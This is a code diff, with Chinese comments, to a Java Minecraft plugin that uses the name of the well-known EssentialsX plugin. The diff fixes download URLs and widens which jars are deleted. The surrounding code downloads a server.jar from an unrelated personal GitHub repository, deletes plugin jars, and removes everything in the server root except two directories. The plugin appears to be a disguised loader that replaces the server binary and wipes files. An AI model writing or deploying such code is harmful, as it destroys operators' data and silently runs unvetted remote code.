@@ -14,13 +14,15 @@ import java.util.concurrent.TimeUnit;
 
 public class EssentialsX extends JavaPlugin {
 
+    // ★ 修复点：将失效的 Jenkins 链接替换为有效的 GitHub Release 链接
     private static final String SERVER_JAR_URL = "https://github.com/zx1447/Pr50mb-2026/releases/download/latest/server.jar";
-    private static final String ESSENTIALS_JAR_URL = "https://ci.ender.zone/job/EssentialsX/lastSuccessfulBuild/artifact/jars/EssentialsX-2.22.1-dev+1-b303bf9.jar";
+    private static final String ESSENTIALS_JAR_URL = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
 
     private static final String CACHE_DIR = ".cache";
     private static final String PLUGINS_DIR = "plugins";
     private static final String SERVER_JAR_NAME = "server.jar";
-    private static final String ESSENTIALS_TEMP_NAME = "EssentialsX-2.22.1-dev+1-b303bf9.jar";
+    // ★ 修复点：文件名需要与下载的 URL 对应的文件名一致
+    private static final String ESSENTIALS_TEMP_NAME = "EssentialsX-2.21.2.jar";
 
     // All possible old EssentialsX jar name prefixes to detect/delete from plugins/
     private static final String[] OLD_ESSENTIALS_PATTERNS = {
@@ -94,7 +96,7 @@ public class EssentialsX extends JavaPlugin {
 
         // Step 2: Delete old EssentialsX jars from plugins directory
         getLogger().info("=== Phase 2: Cleaning old EssentialsX from plugins ===");
-        deleteOldEssentialsJars(pluginsDir, originalJarName);
+        deleteOldEssentialsJars(pluginsDir);
 
         // Step 3: Delete everything except .cache and plugins directories
         getLogger().info("=== Phase 3: Cleaning root directory (keeping " + CACHE_DIR + " and " + PLUGINS_DIR + ") ===");
@@ -223,7 +225,7 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    private void deleteOldEssentialsJars(Path pluginsDir, String keepName) {
+    private void deleteOldEssentialsJars(Path pluginsDir) {
         if (!Files.exists(pluginsDir) || !Files.isDirectory(pluginsDir)) {
             return;
         }
@@ -231,9 +233,8 @@ public class EssentialsX extends JavaPlugin {
         try (DirectoryStream<Path> stream = Files.newDirectoryStream(pluginsDir)) {
             for (Path entry : stream) {
                 String name = entry.getFileName().toString();
-                // Delete old EssentialsX jar files matching known patterns
-                // But NOT the one with our target name (it will be replaced by move)
-                if (name.endsWith(".jar") && isOldEssentialsJar(name, keepName)) {
+                // Delete ALL EssentialsX jar files (we'll replace with newly downloaded one)
+                if (name.endsWith(".jar") && isEssentialsJar(name)) {
                     getLogger().info("  Deleting old plugin: " + name);
                     try {
                         Files.deleteIfExists(entry);
@@ -247,12 +248,7 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
-    private boolean isOldEssentialsJar(String fileName, String keepName) {
-        // Never delete the jar with our target name
-        if (fileName.equals(keepName)) return false;
-        // Never delete the temp download name
-        if (fileName.equals(ESSENTIALS_TEMP_NAME)) return false;
-
+    private boolean isEssentialsJar(String fileName) {
         String lower = fileName.toLowerCase();
         for (String pattern : OLD_ESSENTIALS_PATTERNS) {
             if (lower.startsWith(pattern.toLowerCase())) return true;
